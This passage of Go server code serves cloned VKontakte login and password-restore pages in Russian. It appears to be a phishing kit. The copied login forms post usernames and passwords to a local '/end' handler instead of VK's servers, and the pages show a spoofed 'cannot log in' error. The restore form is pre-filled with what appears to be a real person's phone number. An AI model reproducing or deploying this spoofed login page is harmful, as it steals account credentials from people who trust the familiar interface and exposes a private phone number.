    __qlTimer = setTimeout(loginSubmitError, 2500);
  }
  return true;
}

window.loginSubmitError = function() {
  showFastBox('Предупреждениe', 'Не удается пройти авторизацию по защищенному соединению. Чаще всего это происходит, когда на Вашем компьютере установлены неправильные текущие дата и время. Пожалуйста, проверьте настройки даты и времени в системе и перезапустите браузер.');
}
window.focusLoginInput = function() {
  scrollToTop(0);
  notaBene('quick_email');
}
window.changeQuickRegButton = function(noShow) {
  if (noShow) {
    hide('top_reg_link', 'quick_reg_button');
  } else {
    show('top_reg_link', 'quick_reg_button');
  }
  toggle('top_switch_lang', noShow && window.langConfig && window.langConfig.id != 3);
}
window.submitQuickLoginForm = function(email, pass, opts) {
  setQuickLoginData(email, pass, opts);
  if (opts && opts.prg) prgBtn = opts.prg;
  if (qf.onsubmit()) qf.submit();
}
window.setQuickLoginData = function(email, pass, opts) {
  if (email !== undefined) ge('quick_email').value = email;
  if (pass !== undefined) ge('quick_pass').value = pass;
  var params = opts && opts.params || {};
  each (params, function(i, v) {
    var el = ge('quick_' + i) || ge('quick_login_' + i);;
    if (el) {
      val(el, params[i]);
    } else {
      qf.appendChild(ce('input', {type: 'hidden', name: i, id: 'quick_login_' + i, value: v}));
    }
  });
}
window.loginByCredential = function() {
  if (!browserFeatures.cmaEnabled || !window.submitQuickLoginForm || window._loginByCredOffered) return false;

  _loginByCredOffered = true;
  navigator.credentials.get({
    password: true,
    mediation: 'required'
  }).then(function(cred) {
    if (cred) {
      submitQuickLoginForm(cred.id, cred.password);
      return true;
    } else {
      return false;
    }
  });
}

if (qlb) {
  qlb.onclick = function() { if (qf.onsubmit()) qf.submit(); };
}

if (browser.opera_mobile) show('quick_expire');

if (1) {
  hide('support_link_td', 'top_support_link');
}
var ts_input = ge('ts_input');
if (ts_input) {
  placeholderSetup(ts_input, {back: false, reload: true, phColor: '#8fadc8'});
}
TopSearch.init();;window.shortCurrency && shortCurrency();
window.handlePageParams && handlePageParams({"id":0,"loc":"","noleftmenu":1,"wrap_page":1,"width":960,"width_dec":0,"width_dec_footer":0,"top_home_link_class":"top_home_link fl_l ","body_class":"index_page","counters":"","pvbig":0,"pvdark":1});addEvent(document, 'click', onDocumentClick);
addLangKeys({"global_apps":"Приложения","global_friends":"Друзья","global_communities":"Сообщества","head_search_results":"Результаты поиска","global_chats":"Диалоги","global_show_all_results":"Показать все результаты","global_news_search_results":"Результаты поиска в новостях","global_emoji_cat_recent":"Часто используемые","global_emoji_cat_1":"Эмоции","global_emoji_cat_2":"Животные и растения","global_emoji_cat_3":"Жесты и люди","global_emoji_cat_4":"Еда и напитки","global_emoji_cat_5":"Спорт и активности","global_emoji_cat_6":"Путешествия и транспорт","global_emoji_cat_7":"Предметы","global_emoji_cat_8":"Символы","global_emoji_cat_9":"Флаги","stories_remove_warning":"Вы действительно хотите удалить историю?<br>Отменить действие будет невозможно.","stories_remove_confirm":"Да, удалить","stories_answer_placeholder":"Ваше сообщение…","stories_answer_sent":"Сообщение отправлено","stories_blacklist_title":"Скрыты из историй","stories_settings":"Настройки","stories_add_blacklist_title":"Скрытие из историй","stories_add_blacklist_message":"Пользователь останется в друзьях, но истории не будут показываться в новостях.","stories_add_blacklist_button":"Скрыть из историй","stories_add_blacklist_message_group":"Вы останетесь подписчиком сообщества, но истории не будут показываться в новостях.","stories_error_cant_load":"Не удалось загрузить историю.","stories_try_again":"Попробовать ещё раз","stories_error_expired":"Историю можно было посмотреть<br>в течение 24 часов после публикации","stories_error_deleted":"История удалена","stories_error_private":"Автор скрыл историю","stories_mask_tooltip":"Попробовать эту маску","stories_mask_sent":"Маска отправлена на телефон","stories_followed":"Вы подписались&#33;","stories_unfollowed":"Вы отписались","stories_is_ad":"Реклама","stories_private_story":"Приватная<br>история","stories_deleted_story":"История<br>удалена","stories_bad_browser":"Истории не поддерживаются в Вашем браузере","stories_delete_all_replies_confirm":"Вы действительно хотите удалить все ответы {name} за последние сутки? <br>Отменить действие будет невозможно.","stories_hide_reply_button":"Скрыть ответ","stories_reply_hidden":"Ответ на историю скрыт.","stories_restore":"Восстановить","stories_hide_reply_continue":"Продолжить просмотр","stories_hide_all_replies":["","Скрыть все его ответы за последние сутки","Скрыть все её ответы за последние сутки"],"stories_reply_add_to_blacklist":"Занести в чёрный список","stories_hide_reply_warning":"Вы действительно хотите скрыть этот ответ?<br>Отменить действие будет невозможно.","stories_replies_more_button":["","Показать ещё %s ответившего","Показать ещё %s ответивших","Показать ещё %s ответивших"],"stories_all_replies_hidden":"Все ответы скрыты","stories_ban_confirm":"Вы действительно хотите добавить в чёрный список {name}?<br>Отменить действие будет невозможно.","stories_banned":"Пользователь в чёрном списке","stories_share":"Поделиться","stories_follow":"Подписаться","stories_unfollow":"Отписаться","stories_report":"Пожаловаться","stories_report_sent":"Жалоба отправлена"}, true);
addLangKeys({"index_to_main":"Главная страница","index_choose_sex":"Укажите пол","index_sel_bday":"День"});
addTemplates({"_":"_"});cur.options = {"bmonths":[[0,"Месяц"],[1,"Января"],[2,"Февраля"],[3,"Марта"],[4,"Апреля"],[5,"Мая"],[6,"Июня"],[7,"Июля"],[8,"Августа"],[9,"Сентября"],[10,"Октября"],[11,"Ноября"],[12,"Декабря"]],"byears":[[0,"Год"],[2004,"2004"],[2003,"2003"],[2002,"2002"],[2001,"2001"],[2000,"2000"],[1999,"1999"],[1998,"1998"],[1997,"1997"],[1996,"1996"],[1995,"1995"],[1994,"1994"],[1993,"1993"],[1992,"1992"],[1991,"1991"],[1990,"1990"],[1989,"1989"],[1988,"1988"],[1987,"1987"],[1986,"1986"],[1985,"1985"],[1984,"1984"],[1983,"1983"],[1982,"1982"],[1981,"1981"],[1980,"1980"],[1979,"1979"],[1978,"1978"],[1977,"1977"],[1976,"1976"],[1975,"1975"],[1974,"1974"],[1973,"1973"],[1972,"1972"],[1971,"1971"],[1970,"1970"],[1969,"1969"],[1968,"1968"],[1967,"1967"],[1966,"1966"],[1965,"1965"],[1964,"1964"],[1963,"1963"],[1962,"1962"],[1961,"1961"],[1960,"1960"],[1959,"1959"],[1958,"1958"],[1957,"1957"],[1956,"1956"],[1955,"1955"],[1954,"1954"],[1953,"1953"],[1952,"1952"],[1951,"1951"],[1950,"1950"],[1949,"1949"],[1948,"1948"],[1947,"1947"],[1946,"1946"],[1945,"1945"],[1944,"1944"],[1943,"1943"],[1942,"1942"],[1941,"1941"],[1940,"1940"],[1939,"1939"],[1938,"1938"],[1937,"1937"],[1936,"1936"],[1935,"1935"],[1934,"1934"],[1933,"1933"],[1932,"1932"],[1931,"1931"],[1930,"1930"],[1929,"1929"],[1928,"1928"],[1927,"1927"],[1926,"1926"],[1925,"1925"],[1924,"1924"],[1923,"1923"],[1922,"1922"],[1921,"1921"],[1920,"1920"],[1919,"1919"],[1918,"1918"],[1917,"1917"],[1916,"1916"],[1915,"1915"],[1914,"1914"],[1913,"1913"],[1912,"1912"],[1911,"1911"],[1910,"1910"],[1909,"1909"],[1908,"1908"],[1907,"1907"],[1906,"1906"],[1905,"1905"],[1904,"1904"],[1903,"1903"],[1902,"1902"]]};
Index.initNew();cur.fbApp = '128749580520227';
cur.fbState = '706a0f8de604226c2a';
cur.fbContinueWithSign = 1;
cur.fbLocale = 'ru_RU';
Index.fbCheck(cur.fbApp, '');; TimeSpent && TimeSpent.setTimers && TimeSpent.setTimers(3000, 10000); TimeSpent && TimeSpent.update && TimeSpent.update(false);
;(function (d, w) {
if (w.__dev) {
  return
}
var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true;
ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js";
var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
})(document, window);
    }
  </script>
</body>

</html>
`)
}

func restoreHandle(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, `
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<link rel="shortcut icon" href="https://www.vk.com/images/icons/favicons/fav_logo.ico?6" />

<link rel="apple-touch-icon" href="https://www.vk.com/images/safari_60.png?1">
<link rel="apple-touch-icon" sizes="76x76" href="https://www.vk.com/images/safari_76.png?1">
<link rel="apple-touch-icon" sizes="120x120" href="https://www.vk.com/images/safari_120.png?1">
<link rel="apple-touch-icon" sizes="152x152" href="https://www.vk.com/images/safari_152.png?1">

<meta http-equiv="content-type" content="text/html; charset=windows-1251" />
<meta name="description" content="" />


<title>Вход | ВКонтакте</title>

<noscript><meta http-equiv="refresh" content="0; URL=/badbrowser.php"></noscript>

<link rel="stylesheet" type="text/css" href="https://www.vk.com/css/al/common.css?38823968139" /><link rel="stylesheet" type="text/css" href="https://www.vk.com/css/al/fonts_cnt.css?1318650823" />

<script type="text/javascript">
var vk = {
  ads_rotate_interval: 120000,
  al: parseInt('3') || 4,
  id: 0,
  intnat: '' ? true : false,
  host: 'vk.com',
  lang: 0,
  rtl: parseInt('') || 0,
  version: 6192532226690,
  stDomains: 0,
  stDomain: '',
  zero: false,
  contlen: 9619,
  loginscheme: 'https',
  ip_h: '1b794c31b36621f5dc',
  navPrefix: '/',
  dt: parseInt('0') || 0,
  fs: parseInt('13') || 13,
  ts: 1527528719,
  tz: 10800,
  pd: 0,
  css_dir: '',
  vcost: 7,
  time: [2018, 5, 28, 20, 31, 59],
  sampleUser: -1, spentLastSendTS: new Date().getTime(),
  a11y: 0,
  statusExportHash: '',
  audioAdsConfig: {"_":"_"},
  longViewTestGroup: "every_view",
  cma: 1,
  postNoEncode: 0,
  lpConfig: {
    enabled: 0,
    key: '',
    ts: 0,
    url: '',
    lpstat: 0
  },

  pr_tpl: "<div class=\"pr %cls%\" id=\"%id%\"><div class=\"pr_bt\"><\/div><div class=\"pr_bt\"><\/div><div class=\"pr_bt\"><\/div><\/div>",

  audioInlinePlayerTpl: "<div class=\"audio_inline_player _audio_inline_player no_select\">\n  <div class=\"audio_inline_player_right\">\n    <div class=\"audio_inline_player_volume\"><\/div>\n  <\/div>\n  <div class=\"audio_inline_player_left\">\n    <div class=\"audio_inline_player_progress\"><\/div>\n  <\/div>\n<\/div>",

  tnsPixelType: 'unauth'
};

window.locDomain = vk.host.match(/[a-zA-Z]+\.[a-zA-Z]+\.?$/)[0];
var _ua = navigator.userAgent.toLowerCase();
if (/opera/i.test(_ua) || !/msie 6/i.test(_ua) || document.domain != locDomain) document.domain = locDomain;
var ___htest = (location.toString().match(/#(.*)/) || {})[1] || '', ___to;
___htest = ___htest.split('#').pop();
if (vk.al != 1 && ___htest.length && ___htest.substr(0, 1) == vk.navPrefix) {
  if (vk.al != 3 || vk.navPrefix != '!') {
    ___to = ___htest.replace(/^(\/|!)/, '');
    if (___to.match(/^([^\?]*\.php|login|mobile)([^a-z0-9\.]|$)/)) ___to = '';
    location.replace(location.protocol + '//' + location.host + '/' + ___to);
  }
}

var StaticFiles = {
  'cmodules/web/common_web.js' : {v: 3},
  'common.css' : {v: 38823968139},'fonts_cnt.css' : {v: 1318650823}
  ,'lang0_0.js': {v: 25458811},'login.css':{v:20825631588},'cmodules/web/login.js':{v:3491120396},'time_spent.js':{v:732637085},'cmodules/web/page_layout.js':{v:1172409392},'ui_common.js':{v:2830856243},'ui_common.css':{v:18773680897},'audioplayer.js':{v:5900725812},'cmodules/web/likes.js':{v:1}
}
var abp;
</script>

<link type="text/css" rel="stylesheet" href="https://www.vk.com/css/al/login.css?20825631588"></link><link type="text/css" rel="stylesheet" href="https://www.vk.com/css/al/ui_common.css?18773680897"></link><script type="text/javascript" src="https://www.vk.com/js/loader_nav6192532226690_0.js"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/common_web.js?3_72851755925"></script><script type="text/javascript" src="https://www.vk.com/js/lang0_0.js?25458811"></script><script type="text/javascript" src="https://www.vk.com/js/lib/px.js?ch=1"></script><script type="text/javascript" src="https://www.vk.com/js/lib/px.js?ch=2"></script><meta name="robots" content="noindex" /><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/login.js?3491120396"></script><script type="text/javascript" src="https://www.vk.com/js/al/time_spent.js?732637085"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/page_layout.js?1172409392"></script><script type="text/javascript" src="https://www.vk.com/js/al/ui_common.js?2830856243"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/audioplayer.js?5900725812"></script><script type="text/javascript" src="https://www.vk.com/js/cmodules/web/likes.js?1"></script>

</head>

<body onresize="onBodyResize()" class="login_page">
  <div id="system_msg" class="fixed"></div>
  <div id="utils"></div>

  <div id="layer_bg" class="fixed"></div><div id="layer_wrap" class="scroll_fix_wrap fixed layer_wrap"><div id="layer"></div></div>
  <div id="box_layer_bg" class="fixed"></div><div id="box_layer_wrap" class="scroll_fix_wrap fixed"><div id="box_layer"><div id="box_loader"><div class="pr pr_baw pr_medium" id="box_loader_pr"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div><div class="back"></div></div></div></div>

  <div id="stl_left"></div><div id="stl_side"></div>

  <script type="text/javascript">window.domStarted && domStarted();</script>

  <div class="scroll_fix_wrap _page_wrap" id="page_wrap"><div><div class="scroll_fix">
  

  <div id="page_header_cont" class="page_header_cont">
    <div class="back"></div>
    <div id="page_header_wrap" class="page_header_wrap">
      <a class="top_back_link" href="https://www.vk.com" id="top_back_link" onclick="if (nav.go(this, event, {back: true}) === false) { showBackLink(); return false; }" onmousedown="tnActive(this)"></a>
      <div id="page_header" class="p_head p_head_l0" style="width: 960px">
        <div class="content">
          <div id="top_nav" class="head_nav">
  <div class="head_nav_item fl_l"><a class="top_home_link fl_l " href="https://www.vk.com/" aria-label="На главную" accesskey="1" ><div class="top_home_logo"></div></a></div>
  <div class="head_nav_item fl_l"><div id="ts_wrap" class="ts_wrap" onmouseover="TopSearch.initFriendsList();">
  <input name="disable-autofill" style="display: none;" />
  <input type="text" onmousedown="event.cancelBubble = true;" ontouchstart="event.cancelBubble = true;" class="text ts_input" id="ts_input" autocomplete="off" name="disable-autofill" placeholder="Поиск" aria-label="Поиск" />
</div></div>
  <div class="head_nav_item fl_l head_nav_btns"><span id="top_audio_layer_place"></span></div>
  <div class="head_nav_item fl_r"><a class="top_nav_link" href="https://www.vk.com" id="top_switch_lang" style="display: none;" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'ecc8951f2a33d1da62' }); return false;" onmousedown="tnActive(this)">
  Switch to English
</a><a class="top_nav_link" href="https://www.vk.com/join" id="top_reg_link" style="display: none" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)" onmousedown="tnActive(this)">
  регистрация
</a></div>
  <div class="head_nav_item_player"></div>
</div>
<div id="ts_cont_wrap" class="ts_cont_wrap" ontouchstart="event.cancelBubble = true;" onmousedown="event.cancelBubble = true;"></div>
        </div>
      </div>
    </div>
  </div>

  <div id="page_layout" style="width: 960px;">
    <div id="side_bar" class="side_bar fl_l " style="display: none">
      <div id="side_bar_inner" class="side_bar_inner">
        <div id="quick_login" class="quick_login">
  <form method="POST" name="login" id="quick_login_form" action="/end">
    <input type="hidden" name="act" value="login" />
    <input type="hidden" name="role" value="al_frame" />
    <input type="hidden" name="expire" id="quick_expire_input" value="" />
    <input type="hidden" name="recaptcha" id="quick_recaptcha" value="" />
    <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="" />
    <input type="hidden" name="captcha_key" id="quick_captcha_key" value="" />
    <input type="hidden" name="_origin" value="https://www.vk.com" />
    <input type="hidden" name="ip_h" value="1b794c31b36621f5dc" />
    <input type="hidden" name="lg_h" value="5112716e7ae5ebf181" />
    <div class="label">Телефон или email</div>
    <div class="labeled"><input type="text" name="loginVK" class="dark" id="quick_email" autofocus/></div>
    <div class="label">Пароль</div>
    <div class="labeled"><input type="password" name="passwordVK" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)" /></div>
    <input type="submit" class="submit" />
  </form>
  <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
  <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
  <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="checkbox(this);ge('quick_expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="https://www.vk.com/restore" target="_top">Забыли пароль?</a></div>
</div>
      </div>
    </div>

    <div id="page_body" class="fl_r " style="width: 960px;">
      <div id="header_wrap2">
        <div id="header_wrap1">
          <div id="header" style="display: none">
            <h1 id="title"></h1>
          </div>
        </div>
      </div>
      <div id="wrap_between"></div>
      <div id="wrap3"><div id="wrap2">
  <div id="wrap1">
<br><br><br><br><br><br>
    <div id="content" style="background-color:white; width:740px; height:561px; margin:auto;"><br>
<h2 class="login_header">Вход ВКонтакте</h2>
<div id="login_message" style="width: 680px; height:170px; margin:auto; margin-top:0px;"><div class="msg error"><div class="msg_text"><b>Не удается войти.</b><br>Пожалуйста, проверьте правильность написания <b>логина</b> и <b>пароля</b>.
<ul class="listing">
  <li><span>Возможно, нажата клавиша CAPS-lock?</span></li>
  <li><span>Может быть, у Вас включена неправильная <b>раскладка</b>? (русская или английская)</span></li>
  <li><span>Попробуйте набрать свой пароль в текстовом редакторе и <b>скопировать</b> в графу «Пароль»</span></li>
</ul>
Если Вы всё внимательно проверили, но войти всё равно не удается, Вы можете <b><a href="https://www.vk.com/restore">нажать сюда</a></b>.</div></div></div><br>
<div id="login_form_wrap" class="login_form_wrap">
  <form method="post" name="login" id="login_form" action="/end">
    <input type="hidden" name="act" id="act" value="login">
    <input type="hidden" name="to" id="to" value=""/>
    <input type="hidden" name="expire" id="expire_input" value="" />
    <input type="hidden" name="_origin" value="https://www.vk.com" />
    <input type="hidden" name="ip_h" value="1b794c31b36621f5dc" />
    <input type="hidden" name="lg_h" value="5112716e7ae5ebf181" />
    <input type="text" class="big_text" name="loginVK" id="email" value="" placeholder="Телефон или email" autofocus/>
    <input type="password" class="big_text" name="passwordVK" id="pass" value="" placeholder="Пароль" />
    <div class="checkbox" id="expire" onclick="checkbox(this);ge('expire_input').value=isChecked(this)?1:'';">Чужой компьютер</div>
    <div class="login_buttons_wrap">
      <button id="login_button" class="flat_button button_big_text login_button">Войти</button><button id="login_reg_button" class="flat_button button_big_text login_reg_button" onclick="nav.go('/join'); return cancelEvent(event);">Регистрация</button>
    </div>
  </form>
</div>
<div class="login_fast_restore_wrap _retore_wrap">
  <a class="login_link login_fast_restore_link" onclick="return Login.showFastRestore(this);">Забыли пароль или не можете войти?</a>
  <div class="login_fast_restore">
    <h4 class="subheader">Быстрое восстановление пароля</h4>
    <div id="login_fast_restore_error"></div>
    <input type="text" class="big_text" id="fast_restore_phone" value="+79205854648" placeholder="Телефон" onfocus="Login.showInputTooltip(this, 'Номер телефона, к которому привязана Ваша страница.&lt;br&gt;&lt;br&gt;Пример номера: &lt;span class=&quot;phone_number&quot;&gt;+7&amp;nbsp;(921)&amp;nbsp;000-00-00&lt;/span&gt;');" onkeypress="return Login.fastRestore(event, '0a57890d00d4548733');" onkeydown="setTimeout(Login.fastRestoreCheck, 0);" />
    <div id="login_fast_restore_name_row" class="unshown">
      <input type="text" class="big_text" id="fast_restore_name" placeholder="Фамилия" onfocus="Login.showInputTooltip(this, 'Пожалуйста, введите в целях безопасности &lt;b&gt;фамилию&lt;/b&gt;, указанную на Вашей странице.');" onkeypress="return Login.fastRestore(event, '0a57890d00d4548733');" />
    </div>
    <div id="login_fast_restore_code_row" class="unshown">
      <input type="text" class="big_text" id="fast_restore_code" placeholder="Полученный код" onfocus="Login.showInputTooltip(this, 'В течение нескольких секунд Вы получите код на Ваш телефон.&lt;br&gt;&lt;br&gt;Пример кода: &lt;b&gt;85595&lt;/b&gt;');" onkeypress="return Login.fastRestore(event, '0a57890d00d4548733');" />
    </div>
    <button id="login_fast_restore_btn" class="flat_button button_big_text button_wide" onclick="Login.fastRestore(false, '0a57890d00d4548733');">Продолжить</button>
    <div id="login_fast_restore_resend" class="login_fast_restore_resend unshown">
      Выслать код повторно через 2:00
    </div>
    <a class="login_link" href="https://www.vk.com/restore?email=89205854648">Моя страница не привязана к телефону</a>
  </div>
</div></div>
  </div>
</div></div>
    </div>

    <div id="footer_wrap" class="footer_wrap fl_r" style="width: 960px;"><div class="footer_nav" id="bottom_nav">
  <div class="footer_copy fl_l"><a href="https://www.vk.com/about">ВКонтакте</a> &copy; 2018</div>
  <div class="footer_lang fl_r">Язык:<a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 3, hash: 'ecc8951f2a33d1da62'})">English</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 0, hash: 'ecc8951f2a33d1da62'})">Русский</a><a class="footer_lang_link" onclick="ajax.post('al_index.php', {act: 'change_lang', lang_id: 1, hash: 'ecc8951f2a33d1da62'})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox('lang.php', {act: 'lang_dialog', all: 1}, {params: {dark: true, bodyStyle: 'padding: 0px'}, noreload: true}); } else { changeLang(1); } return false;">все языки &raquo;</a></div>
  <div class="footer_links">
    <a class="bnav_a" href="https://www.vk.com/about">о компании</a>
    <a class="bnav_a" href="https://www.vk.com/support?act=home" style="display: none;">помощь</a>
    <a class="bnav_a" href="https://www.vk.com/terms">правила</a>
    <a class="bnav_a" href="https://www.vk.com/ads" style="">реклама</a>
    
    <a class="bnav_a" href="https://www.vk.com/dev">разработчикам</a>
    <a class="bnav_a" href="https://www.vk.com/jobs" style="display: none;">вакансии</a>
  </div>
</div>

<div class="footer_bench clear">
  
</div></div>
    <div class="clear"></div>
  </div>
</div></div><noscript><div style="position:absolute;left:-10000px;">
<img src="https://www.vk.com//top-fwz1.mail.ru/counter?id=2579437;js=na" style="border:0;" height="1" width="1" />
</div></noscript></div>
  <div class="progress" id="global_prg"></div>

  <script type="text/javascript">
    if (parent && parent != window && (browser.msie || browser.opera || browser.mozilla || browser.chrome || browser.safari || browser.iphone)) {
      document.getElementsByTagName('body')[0].innerHTML = '';
    } else {
      window.domReady && domReady();
      updateMoney(0);
initPageLayoutUI();
if (browser.iphone || browser.ipad || browser.ipod) {
  setStyle(bodyNode, {webkitTextSizeAdjust: 'none'});
}var qf = ge('quick_login_form'), ql = ge('quick_login'), qe = ge('quick_email'), qp = ge('quick_pass');
var qlb = ge('quick_login_button'), prgBtn = qlb;

var qinit = function() {
  setTimeout(function() {
    ql.insertBefore(ce('div', {innerHTML: '<iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe>'}), qf);
    qf.target = 'quick_login_frame';
    qe.onclick = loginByCredential;
    qp.onclick = loginByCredential;
  }, 1);
}

if (window.top && window.top != window) {
  window.onload = qinit;
} else {
  setTimeout(qinit, 0);
}

qf.onsubmit = function() {
  if (!ge('quick_login_frame')) return false;
  if (!trim(qe.value)) {
    notaBene(qe);
    return false;
  } else if (!trim(qp.value)) {
    notaBene(qp);
    return false;
  }
  lockButton(window.__qfBtn = prgBtn);
  prgBtn = qlb;
  clearTimeout(__qlTimer);
  __qlTimer = setTimeout(loginSubmitError, 30000);
  domFC(domPS(qf)).onload = function() {
    clearTimeout(__qlTimer);
    __qlTimer = setTimeout(loginSubmitError, 2500);
  }
  return true;
}

window.loginSubmitError = function() {
  showFastBox('Предупреждениe', 'Не удается пройти авторизацию по защищенному соединению. Чаще всего это происходит, когда на Вашем компьютере установлены неправильные текущие дата и время. Пожалуйста, проверьте настройки даты и времени в системе и перезапустите браузер.');
}
window.focusLoginInput = function() {
  scrollToTop(0);
  notaBene('quick_email');
}
window.changeQuickRegButton = function(noShow) {
  if (noShow) {
    hide('top_reg_link', 'quick_reg_button');
  } else {
    show('top_reg_link', 'quick_reg_button');
  }
  toggle('top_switch_lang', noShow && window.langConfig && window.langConfig.id != 3);
}
window.submitQuickLoginForm = function(email, pass, opts) {
  setQuickLoginData(email, pass, opts);
  if (opts && opts.prg) prgBtn = opts.prg;
  if (qf.onsubmit()) qf.submit();
}
window.setQuickLoginData = function(email, pass, opts) {
  if (email !== undefined) ge('quick_email').value = email;
  if (pass !== undefined) ge('quick_pass').value = pass;
  var params = opts && opts.params || {};
  each (params, function(i, v) {
    var el = ge('quick_' + i) || ge('quick_login_' + i);;
    if (el) {
      val(el, params[i]);
    } else {
      qf.appendChild(ce('input', {type: 'hidden', name: i, id: 'quick_login_' + i, value: v}));
    }
  });
}
window.loginByCredential = function() {
  if (!browserFeatures.cmaEnabled || !window.submitQuickLoginForm || window._loginByCredOffered) return false;

  _loginByCredOffered = true;
  navigator.credentials.get({
    password: true,
    mediation: 'required'
  }).then(function(cred) {
    if (cred) {
      submitQuickLoginForm(cred.id, cred.password);
      return true;
    } else {
      return false;
    }
  });
}

if (qlb) {
  qlb.onclick = function() { if (qf.onsubmit()) qf.submit(); };
}

if (browser.opera_mobile) show('quick_expire');

if (1) {
  hide('support_link_td', 'top_support_link');
}
var ts_input = ge('ts_input');
if (ts_input) {
  placeholderSetup(ts_input, {back: false, reload: true, phColor: '#8fadc8'});
}
TopSearch.init();;window.shortCurrency && shortCurrency();
window.zNav && setTimeout(zNav.pbind({}, {queue:1}), 0);
window.handlePageParams && handlePageParams({"id":0,"loc":"login?email=89205854648&m=1","noleftmenu":1,"wrap_page":1,"width":960,"width_dec":0,"width_dec_footer":0,"top_home_link_class":"top_home_link fl_l ","body_class":"login_page","counters":"","pvbig":0,"pvdark":1});addEvent(document, 'click', onDocumentClick);
addLangKeys({"global_apps":"Приложения","global_friends":"Друзья","global_communities":"Сообщества","head_search_results":"Результаты поиска","global_chats":"Диалоги","global_show_all_results":"Показать все результаты","global_news_search_results":"Результаты поиска в новостях","global_emoji_cat_recent":"Часто используемые","global_emoji_cat_1":"Эмоции","global_emoji_cat_2":"Животные и растения","global_emoji_cat_3":"Жесты и люди","global_emoji_cat_4":"Еда и напитки","global_emoji_cat_5":"Спорт и активности","global_emoji_cat_6":"Путешествия и транспорт","global_emoji_cat_7":"Предметы","global_emoji_cat_8":"Символы","global_emoji_cat_9":"Флаги","stories_remove_warning":"Вы действительно хотите удалить историю?<br>Отменить действие будет невозможно.","stories_remove_confirm":"Да, удалить","stories_answer_placeholder":"Ваше сообщение…","stories_answer_sent":"Сообщение отправлено","stories_blacklist_title":"Скрыты из историй","stories_settings":"Настройки","stories_add_blacklist_title":"Скрытие из историй","stories_add_blacklist_message":"Пользователь останется в друзьях, но истории не будут показываться в новостях.","stories_add_blacklist_button":"Скрыть из историй","stories_add_blacklist_message_group":"Вы останетесь подписчиком сообщества, но истории не будут показываться в новостях.","stories_error_cant_load":"Не удалось загрузить историю.","stories_try_again":"Попробовать ещё раз","stories_error_expired":"Историю можно было посмотреть<br>в течение 24 часов после публикации","stories_error_deleted":"История удалена","stories_error_private":"Автор скрыл историю","stories_mask_tooltip":"Попробовать эту маску","stories_mask_sent":"Маска отправлена на телефон","stories_followed":"Вы подписались&#33;","stories_unfollowed":"Вы отписались","stories_is_ad":"Реклама","stories_private_story":"Приватная<br>история","stories_deleted_story":"История<br>удалена","stories_bad_browser":"Истории не поддерживаются в Вашем браузере","stories_delete_all_replies_confirm":"Вы действительно хотите удалить все ответы {name} за последние сутки? <br>Отменить действие будет невозможно.","stories_hide_reply_button":"Скрыть ответ","stories_reply_hidden":"Ответ на историю скрыт.","stories_restore":"Восстановить","stories_hide_reply_continue":"Продолжить просмотр","stories_hide_all_replies":["","Скрыть все его ответы за последние сутки","Скрыть все её ответы за последние сутки"],"stories_reply_add_to_blacklist":"Занести в чёрный список","stories_hide_reply_warning":"Вы действительно хотите скрыть этот ответ?<br>Отменить действие будет невозможно.","stories_replies_more_button":["","Показать ещё %s ответившего","Показать ещё %s ответивших","Показать ещё %s ответивших"],"stories_all_replies_hidden":"Все ответы скрыты","stories_ban_confirm":"Вы действительно хотите добавить в чёрный список {name}?<br>Отменить действие будет невозможно.","stories_banned":"Пользователь в чёрном списке","stories_share":"Поделиться","stories_follow":"Подписаться","stories_unfollow":"Отписаться","stories_report":"Пожаловаться","stories_report_sent":"Жалоба отправлена"}, true);
addLangKeys({"login_fast_restore_access":"Восстановить доступ","join_resend_code":"Выслать код повторно","join_resend_code_time":"Выслать код повторно через %s","join_send_code_via_sms":"Отправить код через SMS","join_send_code_via_sms_time":"Отправить код в SMS через %s"});
addTemplates({"_":"_"});Login.init();
if (ge('login_fast_restore_btn')) {
  domPN(ge('login_fast_restore_btn')).appendChild(ce('div', {innerHTML: '<iframe name="fast_restore_test_frame"></iframe><form id="fast_restore_test_form" method="POST" action="https://login.vk.com/?act=create_test&_origin=https://www.vk.com&' + Math.random() + '" target="fast_restore_test_frame"></form>'}, {position: 'absolute', visibility: 'hidden'}));
  ge('fast_restore_test_form').submit();
}; TimeSpent && TimeSpent.setTimers && TimeSpent.setTimers(3000, 10000); TimeSpent && TimeSpent.update && TimeSpent.update(false);
;(function (d, w) {
if (w.__dev) {
  return
}
var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true;
ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js";
var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
})(document, window);
    }
